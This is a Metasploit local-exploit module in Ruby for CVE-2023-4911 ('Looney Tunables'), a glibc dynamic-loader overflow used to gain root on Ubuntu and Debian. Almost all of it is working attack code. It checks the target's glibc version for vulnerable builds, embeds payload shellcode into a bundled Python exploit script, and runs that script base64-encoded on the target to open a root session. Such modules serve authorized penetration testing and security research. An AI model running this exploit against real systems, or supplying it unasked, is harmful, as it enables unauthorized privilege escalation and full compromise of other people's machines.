##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  # includes: is_root?
  include Msf::Post::Linux::Priv
  # includes: kernel_release
  include Msf::Post::Linux::Kernel
  # include: get_sysinfo
  include Msf::Post::Linux::System
  # includes writable?, upload_file, upload_and_chmodx, exploit_data, cd
  include Msf::Post::File
  # includes register_files_for_cleanup
  include Msf::Exploit::FileDropper
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Glibc Tunables Privilege Escalation CVE-2023-4911 (aka Looney Tunables)',
        'Description' => %q{
          A buffer overflow exists in the GNU C Library's dynamic loader ld.so while processing the GLIBC_TUNABLES
          environment variable. This issue allows an local attacker to use maliciously crafted GLIBC_TUNABLES when
          launching binaries with SUID permission to execute code in the context of the root user.

          This module targets glibc packaged on Ubuntu and Debian. The specific glibc versions this module targets are:

          Ubuntu:
          2.35-0ubuntu3.4 > 2.35
          2.37-0ubuntu2.1 > 2.37
          2.38-1ubuntu6 > 2.38

          Debian:
          2.31-13-deb11u7 > 2.31
          2.36-9-deb12u3 > 2.36

          Fedora 37 and 38 and other distributions of linux also come packaged with versions of glibc vulnerable to CVE-2023-4911
          however this module does not target them.
        },
        'Author' => [
          'Qualys Threat Research Unit', # discovery
          'blasty <peter@haxx.in>', # PoC
          'jheysel-r7' # msf module
        ],
        'References' => [
          ['CVE', '2023-4911'],
          ['URL', 'https://haxx.in/files/gnu-acme.py'],
          ['URL', 'https://www.qualys.com/2023/10/03/cve-2023-4911/looney-tunables-local-privilege-escalation-glibc-ld-so.txt'],
          ['URL', 'https://security-tracker.debian.org/tracker/CVE-2023-4911'],
          ['URL', 'https://ubuntu.com/security/CVE-2023-4911']
        ],
        'License' => MSF_LICENSE,
        'Platform' => [ 'linux', 'unix' ],
        'Arch' => [ ARCH_X86, ARCH_X64 ],
        'SessionTypes' => [ 'shell', 'meterpreter' ],
        'Targets' => [[ 'Auto', {} ]],
        'Privileged' => true,
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'PrependSetresgid' => true,
          'PrependSetresuid' => true,
          'WfsDelay' => 600
        },
        'DisclosureDate' => '2023-10-03',
        'Notes' => {
          'Stability' => [ CRASH_SAFE, ],
          'SideEffects' => [ ARTIFACTS_ON_DISK, ],
          'Reliability' => [ REPEATABLE_SESSION, ]
        }
      )
    )
    register_advanced_options([
      OptString.new('WritableDir', [ true, 'A directory where you can write files.', '/tmp' ])
    ])
  end

  def find_exec_program
    %w[python python3].select(&method(:command_exists?)).first
  rescue => e
    fail_with(Failure::Unknown, "An error occurred finding a version of python to use: #{e.message}")
  end

  def check
    glibc_version = cmd_exec('ldd --version')&.scan(/ldd\s+\(\w+\s+GLIBC\s+(\S+)\)/)&.flatten&.first
    return CheckCode::Unknown('Could not get the version of glibc') unless glibc_version

    sysinfo = get_sysinfo
    case sysinfo[:distro]
    when 'ubuntu'
      if (Rex::Version.new('2.35-0ubuntu3.4') > Rex::Version.new(glibc_version) && Rex::Version.new('2.35') > Rex::Version.new(glibc_version)) ||
         (Rex::Version.new('2.37-0ubuntu2.1') > Rex::Version.new(glibc_version) && Rex::Version.new('2.37') > Rex::Version.new(glibc_version)) ||
         (Rex::Version.new('2.38-1ubuntu6') > Rex::Version.new(glibc_version) && Rex::Version.new('2.38') > Rex::Version.new(glibc_version))
        return CheckCode::Appears("The glibc version (#{glibc_version}) found on the target appears to be vulnerable")
      end
    when 'debian'
      # Debian's version contain a "+" which Rex complains about via:  ArgumentError Malformed version number string
      glibc_version.gsub!('+', '-')
      if (Rex::Version.new('2.31-13-deb11u7') > Rex::Version.new(glibc_version) && Rex::Version.new('2.31') > Rex::Version.new(glibc_version)) ||
         (Rex::Version.new('2.36-9-deb12u3') > Rex::Version.new(glibc_version) && Rex::Version.new('2.36') > Rex::Version.new(glibc_version))
        return CheckCode::Appears("The glibc version (#{glibc_version}) found on the target appears to be vulnerable")
      end
    else
      return CheckCode::Unknown('The module has not been tested against this Linux distribution')
    end
    CheckCode::Safe("The glibc version (#{glibc_version}) found on the target does not appear to be vulnerable")
  end

  def exploit
    fail_with(Failure::BadConfig, 'Session already has root privileges') if is_root?

    python_binary = find_exec_program
    fail_with(Failure::NotFound, 'The python binary was not found.') unless python_binary
    vprint_status("Using '#{python_binary}' to run the exploit")

    # The python script assumes the working directory is the one we can write to.
    cd(datastore['WritableDir'])
    shell_code = payload.encoded.unpack('H*').first
    exploit_data = exploit_data('CVE-2023-4911', 'cve_2023_4911.py').gsub('METASPLOIT_SHELL_CODE', shell_code)

    # If there is no response from cmd_exec after the brief 15s timeout, this indicates exploit is running successfully
    output = cmd_exec("$(echo #{Rex::Text.encode_base64(exploit_data)} |base64 -d | #{python_binary})")
    if output.blank?
      print_good('The exploit is running. Please be patient. Receiving a session could take up to 10 minutes.')
    else
      print_line(output)
    end
  end
end
